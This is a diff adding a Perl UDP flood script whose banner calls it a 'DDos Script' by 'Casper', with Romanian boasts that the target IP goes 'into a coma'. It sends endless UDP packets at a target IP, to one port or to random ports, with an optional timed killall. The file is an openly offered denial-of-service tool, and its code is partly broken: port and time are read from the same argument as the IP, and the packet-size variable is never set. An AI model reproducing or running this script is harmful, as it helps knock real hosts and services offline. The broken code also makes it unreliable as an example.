@@ -1,0 +1,58 @@
+#!/usr/bin/perl
+use Socket;
+$ARGC=@ARGV;
+my ($ip,$port,$size,$time);
+$ip=$ARGV[0];
+$port=$ARGV[0];
+$time=$ARGV[0];
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+$iaddr = inet_aton("$ip");
+
+printf "[1;35m#[1;33m#[1;31m*[0;32m  
+
+
+ ,--^----------,--------,-----,-------^--,
+ | |||||||||   `--------'     |          O
+ `+---------------Casper n.r1--^---------|
+   `_,-------, __________________________|
+     / XXXXXX /`|    /
+    / Casper /  `   /
+   / XXXXXX /______(
+  / XXXXXX /
+ / XXXXXX /
+(________(
+ `------'
+   
+                                                                                        
+ [1;36m$ipn";
+printf "[1;35m#[1;33m#[1;31m*[0;32m DDos Script |[0;31mbY Casper [0m\n";
+printf "[1;35m#[1;33m#[1;31m*[0;32m Respect [1;33CNimeni Altu [1;36m[#Casper] [0m\n";
+printf "[1;35m#[1;33m#[1;31m*[0;32m Daca Nu [1;36mPica[0;32m @ [1;33mUrca-l pe mirc [0m\n";
+printf "[1;35m#[1;33m#[1;31m*[0;32m Ip-u [1;36mA intrat[0;32m @ [1;33mIn coma [0m\n";
+
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &"); 
+goto randpackets;
+}
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=(rand 65000) +1;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
